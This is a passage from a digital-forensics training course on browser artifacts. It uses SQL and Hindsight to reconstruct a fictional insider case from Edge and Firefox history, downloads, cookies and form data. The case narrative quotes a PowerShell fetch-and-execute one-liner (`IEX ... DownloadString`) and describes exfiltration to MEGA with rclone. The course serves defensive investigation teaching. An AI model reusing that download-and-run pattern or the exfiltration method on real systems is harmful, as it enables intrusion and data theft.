- Hindsight's Query String Parser decoded the searches (`q: rclone mega config`); its cookie rows show Edge's values as `<encrypted>` and Firefox's in clear.

### Lab 3: When the tool breaks: JSONL and Firefox cookies (15 min)

The same run with JSONL output, then with only the Edge profile:

```bash
hindsight -i work/AppData -o work/alice -f jsonl -l $PWD/work/hindsight-jsonl.log 2>&1 | grep -E '^[A-Za-z]+Error'
wc -c < work/alice.jsonl
hindsight -i "work/AppData/Local/Microsoft/Edge/User Data" -o work/edge -f jsonl -l $PWD/work/hindsight-edge.log > /dev/null
python3 - work/edge.jsonl <<'EOF'
import json, sys
for line in open(sys.argv[1]):
    r = json.loads(line)
    if r["data_type"] == "chrome:history:file_downloaded":
        for k in ("datetime", "url", "target_path", "received_bytes", "state_friendly", "danger_type_friendly",
                  "referrer", "tab_url", "mime_type"):
            print(f"{k:21} {r.get(k)!r}")
EOF
```

```
KeyError: 'expires_utc'
0
datetime              '2026-09-29T01:02:02.874516+00:00'
url                   'http://203.0.113.50/payload.ps1'
target_path           'C:\\Users\\alice\\Downloads\\payload.ps1'
received_bytes        75
state_friendly        'Complete'
danger_type_friendly  'Not Dangerous'
referrer              ''
tab_url               ''
mime_type             'application/octet-stream'
```

The JSONL writer failed and left an empty file. Lab 5 shows why: Firefox now stores cookie `expiry` in milliseconds, Hindsight converts it as seconds (year 59806), drops the date, and the JSONL writer expects it. **The SQLite output earlier wasn't affected**, and the Edge-only JSONL is fine. The lesson isn't "Hindsight is broken": it's that browsers change their schemas every few weeks, and you check a tool's output against the raw tables before you rely on it, as below.

### Lab 4: Edge with SQL (what you'd run in DB4S) (30 min)

Visits with their transitions, searches, and the download:

```bash
H="$E/History"
sqlite3 -readonly -separator '  ' "$H" "SELECT v.id, strftime('%Y-%m-%d %H:%M:%f', v.visit_time / 1e6 - 11644473600, 'unixepoch'),
  printf('0x%08X', v.transition), v.transition & 255, v.from_visit, round(v.visit_duration / 1e6, 1), substr(u.url, 1, 58)
  FROM visits v JOIN urls u ON u.id = v.url ORDER BY v.visit_time;"
sqlite3 -readonly "$H" "SELECT term FROM keyword_search_terms;"
sqlite3 -readonly -line "$H" "SELECT c.url AS url_chain, d.target_path,
  strftime('%Y-%m-%d %H:%M:%f', d.start_time / 1e6 - 11644473600, 'unixepoch') AS start,
  strftime('%Y-%m-%d %H:%M:%f', d.end_time / 1e6 - 11644473600, 'unixepoch') AS end,
  d.received_bytes, d.total_bytes, d.state, d.danger_type, d.opened, d.referrer, d.tab_url, d.etag, d.last_modified
  FROM downloads d JOIN downloads_url_chains c ON c.id = d.id;"
sqlite3 -readonly "$H" "SELECT count(*) FROM urls WHERE url LIKE '%203.0.113.50%';"
python3 -c 'import datetime as d; print(d.datetime.fromtimestamp(0x65c9399b52f40 / 1e6, d.timezone.utc))'
```

```
1  2026-09-28 07:59:44.204  0x30000002  2  0  81.7  https://intranet.corp.example/
2  2026-09-28 08:01:06.512  0x30000002  2  0  36089.3  https://mail.corp.example/owa/
3  2026-09-29 00:59:47.303  0x30000002  2  0  35.6  https://mail.corp.example/owa/
4  2026-09-29 01:00:22.918  0x32000005  5  0  8.5  https://www.bing.com/search?q=rclone+mega+config&form=ANAB
5  2026-09-29 01:00:31.455  0x30000000  0  4  38.2  https://rclone.org/mega/
6  2026-09-29 01:01:09.700  0x32000005  5  0  11.4  https://www.bing.com/search?q=powershell+run+script+from+u
7  2026-09-29 01:01:21.164  0x30000000  0  6  41.7  https://learn.microsoft.com/en-us/powershell/module/micros
powershell run script from url one line
rclone mega config
     url_chain = http://203.0.113.50/payload.ps1
   target_path = C:\Users\alice\Downloads\payload.ps1
         start = 2026-09-29 01:02:02.875
           end = 2026-09-29 01:02:03.127
received_bytes = 75
   total_bytes = 75
         state = 1
   danger_type = 0
        opened = 0
      referrer = 
       tab_url = 
          etag = "4b-65c9399b52f40"
 last_modified = Mon, 28 Sep 2026 23:41:09 GMT
0
2026-09-28 23:41:09+00:00
```

Read it as an investigator:

- **Visits 1–3** came from the Favorites bar (core 2). **Visits 4 and 6** are searches typed into the address bar (core 5 + `0x02000000`); `keyword_search_terms` keeps the exact terms. **Visits 5 and 7** are link clicks (`from_visit` 4 and 6): rclone's MEGA page from the first search, Microsoft's `Invoke-Expression` page from the second. `payload.ps1` itself is `IEX (New-Object Net.WebClient).DownloadString(...)` (Day 10): a one-line script runner.
- The **download** took 0.25 s, finished (state 1), raised no warning (danger type 0), and was never opened from the browser (`opened` 0). **`referrer` and `tab_url` are empty**: nobody clicked a link to it; the URL was typed or pasted. That matches the `Zone.Identifier` of Days 10 and 16, which has `HostUrl` and **no `ReferrerUrl`**.
- `count(*) = 0`: the download URL is **not** in `urls`. Searching `urls` alone for "203.0.113.50" would miss it.
- The **ETag** `"4b-65c9399b52f40"` has the shape of Apache's default: size (0x4b = 75 bytes) and modification time in microseconds, which decodes to **2026-09-28 23:41:09**, the same as `Last-Modified`. The payload was put on the server less than 90 minutes before it was downloaded.

Cookies, settings and the session log:

```bash
sqlite3 -readonly -separator '  ' "$E/Network/Cookies" "SELECT host_key, name, length(value), substr(encrypted_value, 1, 3), length(encrypted_value),
  strftime('%Y-%m-%d %H:%M:%S', creation_utc / 1e6 - 11644473600, 'unixepoch'), strftime('%Y-%m-%d %H:%M:%S', last_access_utc / 1e6 - 11644473600, 'unixepoch'),
  strftime('%Y-%m-%d', expires_utc / 1e6 - 11644473600, 'unixepoch') FROM cookies ORDER BY creation_utc;"
python3 - "$E/Preferences" "$E/../Local State" <<'EOF'
import base64, datetime, json, sys
webkit = lambda v: datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=int(v))
prefs = json.load(open(sys.argv[1]))
print("Edge marker key 'edge' present:", "edge" in prefs, "| downloads to", prefs["download"]["default_directory"])
for e in prefs["sessions"]["event_log"]:
    kind = {0: "start", 2: "exit"}[e["type"]]
    print(f'  {webkit(e["time"]):%Y-%m-%d %H:%M:%S}  profile {kind:5}  tabs {e.get("tab_count", "")}')
key = base64.b64decode(json.load(open(sys.argv[2]))["os_crypt"]["encrypted_key"])
print("Local State os_crypt key starts with", key[:5], f"({len(key)} bytes)")
EOF
```

```
.bing.com  MUID  0  v10  63  2026-03-02 09:14:22  2026-09-29 01:01:09  2027-04-06
mail.corp.example  session  0  v10  63  2026-09-28 08:01:07  2026-09-29 00:59:47  2026-10-28
Edge marker key 'edge' present: True | downloads to C:\Users\alice\Downloads
  2026-09-28 07:59:31  profile start  tabs 
  2026-09-28 18:02:35  profile exit   tabs 2
  2026-09-29 00:59:12  profile start  tabs 
  2026-09-29 01:36:44  profile exit   tabs 4
Local State os_crypt key starts with b'DPAPI' (235 bytes)
```

- Edge's cookie values are 63-byte `v10` blobs (3-byte prefix + 12-byte nonce + data + 16-byte tag); the key in `Local State` starts with `DPAPI`. The **times are readable without decrypting**: the mail session cookie was last sent at 00:59:47, the minute Edge started.
- The **session event log** in `Preferences` gives Edge's start and exit times: 07:59–18:02 on a normal working day, then **00:59:12 to 01:36:44** at night, closed with 4 tabs open. 00:59:12 matches Sysmon's `msedge.exe` process start (Day 16).

### Lab 5: Firefox with SQL, and what Hindsight didn't show (30 min)

```bash
P=$F/places.sqlite
sqlite3 -readonly -separator '  ' $P "SELECT v.id, strftime('%Y-%m-%d %H:%M:%f', v.visit_date / 1e6, 'unixepoch'), v.visit_type, v.source, v.from_visit, substr(p.url, 1, 70)
  FROM moz_historyvisits v JOIN moz_places p ON p.id = v.place_id ORDER BY v.visit_date;"
sqlite3 -readonly -separator '  ' $P "SELECT a.place_id, n.name, a.content FROM moz_annos a JOIN moz_anno_attributes n ON n.id = a.anno_attribute_id;"
sqlite3 -readonly -separator '  ' $P "SELECT substr(p.url, 1, 30), strftime('%H:%M:%f', m.created_at / 1e3, 'unixepoch'), m.total_view_time / 1000.0,
  m.typing_time / 1000.0, m.key_presses, m.scrolling_distance FROM moz_places_metadata m JOIN moz_places p ON p.id = m.place_id;"
sqlite3 -readonly -separator '  ' $F/formhistory.sqlite "SELECT fieldname, value, timesUsed, strftime('%Y-%m-%d %H:%M:%f', firstUsed / 1e6, 'unixepoch') FROM moz_formhistory;"
sqlite3 -readonly -separator '  ' $F/cookies.sqlite "SELECT host, name, creationTime, expiry, strftime('%Y-%m-%d %H:%M:%S', creationTime / 1e6, 'unixepoch'),
  strftime('%Y-%m-%d %H:%M:%S', expiry / 1e3, 'unixepoch') FROM moz_cookies;"
python3 -c 'import datetime; datetime.datetime.fromtimestamp(1825150135334)' 2>&1 | tail -n 1
ls work/AppData/Roaming/Mozilla/Firefox/Profiles/q7w1k2zd.default-release
```

```
1  2026-09-28 10:08:55.210  1  3  0  https://www.bing.com/search?q=copy+whole+folder+to+mega+without+the+ap
2  2026-09-28 10:09:21.878  1  0  1  https://rclone.org/mega/
3  2026-09-28 10:10:12.520  1  0  2  https://mega.nz/register
4  2026-09-28 10:11:02.403  1  0  2  https://rclone.org/downloads/
5  2026-09-28 10:11:40.119  7  0  4  https://downloads.rclone.org/v1.68.2/rclone-v1.68.2-windows-amd64.zip
6  2026-09-28 10:12:47.660  2  0  0  https://downloads.example.net/
5  downloads/destinationFileURI  file:///C:/Users/alice/Downloads/rclone-v1.68.2-windows-amd64.zip
5  downloads/metaData  {"state":2,"deleted":false,"endTime":1790590312613}
https://rclone.org/mega/  10:09:21.912  97.14  0.0  0  5412
https://mega.nz/register  10:10:12.560  46.83  15.82  61  380
https://downloads.example.net/  10:12:47.702  51.2  0.0  0  0
email  drop.box.7731@example.com  1  2026-09-28 10:10:41.734
.bing.com  MUID  1790590135334120  1825150135334  2026-09-28 10:08:55  2027-11-02 10:08:55
mega.nz  lang  1790590212802563  1825150212802  2026-09-28 10:10:12  2027-11-02 10:10:12
ValueError: year 59806 is out of range
cookies.sqlite
cookies.sqlite-shm
cookies.sqlite-wal
formhistory.sqlite
formhistory.sqlite-shm
formhistory.sqlite-wal
places.sqlite
places.sqlite-shm
places.sqlite-wal
prefs.js
times.json
```

- **Visits:** visit 1 has `source` 3 (a search results page); 2–4 follow links (`from_visit`); 5 is type **7, a download**; 6 is type **2, typed**: `downloads.example.net` was typed by hand at 10:12:47, 57 seconds before PowerShell requested `rc.zip` from it (PowerShell started at 10:13:41, `Invoke-WebRequest` at 10:13:44: Days 14 and 16).
- **The download failed:** `downloads/metaData` has `"state":2` and an `endTime` (milliseconds) 12 s after the start. Hindsight listed the download but **not its state**. A minute later the same tool came from `downloads.example.net` through PowerShell, which leaves no Mark of the Web.
- **Interactions** (not parsed by Hindsight): rclone's MEGA page was in view for 97 s and scrolled 5,412 pixels; on `mega.nz/register` someone spent 15.8 s typing, **61 key presses**; 51 s on the staging server's index page.
- **Form history:** the `email` field got `drop.box.7731@example.com` at 10:10:41, during the visit to the sign-up page. The MEGA account that rclone used for the exfiltration (Day 9's `rc.conf`) was typed in alice's browser the day before.
- **Cookies:** creation times in microseconds, `expiry` in milliseconds, 400 days later. Treat `expiry` as seconds and you get the year 59806 and Lab 3's crash.
- The final `ls`: running `sqlite3 -readonly` on the work copies created `-wal` and `-shm` files. On the copies that's harmless; on the evidence it would not be.

Optional (no expected output): close your own browser, copy your own profile to `work/mine` and run Hindsight and the queries above on it. Which transitions and visit sources do you see most?

---

## ✅ Knowledge check

1. Where are the history databases of Edge and Firefox for user `bob` on Windows, and which file lists Bob's Firefox profiles?
2. Convert the WebKit time `13435117322874516` to UTC. What's the formula?
3. A Chromium visit has `transition` `0x30000001`; another has `0x32000005`. What did the user do in each case?
4. You search Chrome's `urls` table for a download URL and find nothing. Is the download gone?
5. A Chromium download has an empty `referrer` and `tab_url`, and the file's `Zone.Identifier` has `HostUrl` but no `ReferrerUrl`. What does that suggest?
6. Why isn't `sqlite3 -readonly places.sqlite` enough to keep evidence unchanged, and what do you do instead?
7. Name two things in Firefox's `places.sqlite` that Hindsight 2026.06 didn't show today, and the table each is in.
8. Edge's cookie values are encrypted. What can you still use, and what would you need to decrypt them?

<details>
<summary><b>Answers</b></summary>

1. Edge: `C:\Users\bob\AppData\Local\Microsoft\Edge\User Data\<Profile>\History` (`Default`, `Profile 1`...). Firefox: `C:\Users\bob\AppData\Roaming\Mozilla\Firefox\Profiles\<random>.<name>\places.sqlite`, listed in `C:\Users\bob\AppData\Roaming\Mozilla\Firefox\profiles.ini` (and `installs.ini`).
2. `13435117322874516 / 1,000,000 - 11,644,473,600 = 1790643722.874516` Unix seconds = **2026-09-29 01:02:02.874516 UTC**, the start of alice's `payload.ps1` download. WebKit time is microseconds since 1601-01-01.
3. `0x30000001`: core 1, **TYPED**: the user typed (or picked) the URL in the address bar, a single-step chain. `0x32000005`: core 5, **GENERATED** with the from-address-bar qualifier: the user typed a **search** into the address bar.
4. No. A navigation that becomes a download isn't recorded as a visit. Look in `downloads` and `downloads_url_chains` (and in the `Zone.Identifier` of the file).
5. Nobody clicked a link to it in a page: the URL was **typed or pasted** into the address bar (or opened from another program). Chromium writes `ReferrerUrl` into the Mark of the Web when there is one.
6. On a WAL database, SQLite creates `-wal` and `-shm` files next to the database even in read-only mode (and a read-write open can checkpoint the WAL into the file). Collect the database **with** its `-wal`/`-shm`, hash them, and query a **copy**. `?immutable=1` creates nothing but ignores any WAL.
7. Any two of: the **download state** (`moz_annos`, `downloads/metaData`: state 2 = failed); **page interactions** (`moz_places_metadata`: view time, typing time, key presses, scrolling); the **visit source** (3 = search results page, `moz_historyvisits.source`); the cookie **expiry** (`moz_cookies`, milliseconds).
8. The host, name, path, flags and the **creation, last-access and expiry times** are in clear. Decryption needs the AES key from `Local State` (`os_crypt.encrypted_key`), which is protected by the user's **DPAPI** keys (the user's password or a live session); for `v20` values (Chrome 127+) also the app-bound key.

</details>

---

## 📚 Further reading

- Ryan Benson, *Hindsight* (https://github.com/RyanDFIR/hindsight): README and the user guide in `documentation/`
- Chromium source, `ui/base/page_transition_types.h`: every transition type and qualifier
- Firefox source (https://github.com/mozilla-firefox/firefox): `toolkit/components/places/nsPlacesTables.h` (places tables), `nsINavHistoryService.idl` (visit types and sources), `toolkit/components/downloads/DownloadHistory.sys.mjs` (download states), `netwerk/cookie/CookiePersistentStorage.cpp` (cookie schema and its units)
- SQLite, *Database File Format* (header byte 18) and *Write-Ahead Logging*; URI parameter `immutable` (https://www.sqlite.org/uri.html)
- NirSoft, *BrowsingHistoryView* (https://www.nirsoft.net/utils/browsing_history_view.html); KAPE module `NirSoft_BrowsingHistoryView` and targets `Chrome`, `EdgeChromium`, `Firefox`, `WebBrowsers`; Velociraptor artifact `Windows.Applications.NirsoftBrowserViewer`
- DB Browser for SQLite documentation (https://github.com/sqlitebrowser/sqlitebrowser/wiki)

---

## ⏭️ Tomorrow: Day 19

**Email forensics: PST/OST, EML/MSG and header analysis.** Tools: **libpff (pffexport)**, **readpst**, **eml_analyzer**.
Today alice's browser showed a mail tab open all night. Tomorrow: what's inside a mailbox file, how to export it, and how to read an email's headers to tell where a message really came from.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
